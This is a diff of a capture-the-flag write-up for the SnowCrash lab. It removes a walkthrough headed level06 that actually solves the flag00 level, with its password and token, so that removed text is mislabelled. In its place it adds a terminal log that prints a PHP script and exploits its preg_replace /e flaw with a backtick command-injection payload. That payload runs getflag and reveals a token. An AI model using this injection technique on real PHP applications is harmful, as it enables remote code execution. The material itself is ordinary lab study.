@@ -1,40 +1,14 @@
-# Resources for level06
-
-## Walkthrough to capture the flag:
-
-### Step 1: Find files owned by user `flag00`
-```bash
-find / -user flag00 2>/dev/null
-```
-> Output:
-```
-/usr/sbin/john
-/rofs/usr/sbin/john
-```
-
-### Step 2: Read the encrypted string
-```bash
-cat /rofs/usr/sbin/john
-```
-> Output:
-```
-cdiiddwpgswtgt
-```
-
-### Step 3: Decrypt it (likely ROT13)
-Decrypted password: `nottoohardhere`
-
-### Step 4: Switch to `flag00` user
-```bash
-su flag00
-# enter password: nottoohardhere
-```
-
-### Step 5: Get the flag
-```bash
-getflag
-```
-> Output:
-```
-Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
-```
+level06@SnowCrash:~$ cat level06.php 
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+level06@SnowCrash:~$ echo '[x ${`getflag`} ]' > /tmp/getflag
+level06@SnowCrash:~$ cat /tmp/getflag
+[x ${`getflag`} ]
+level06@SnowCrash:~$ ./level06 /tmp/getflag
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+ 
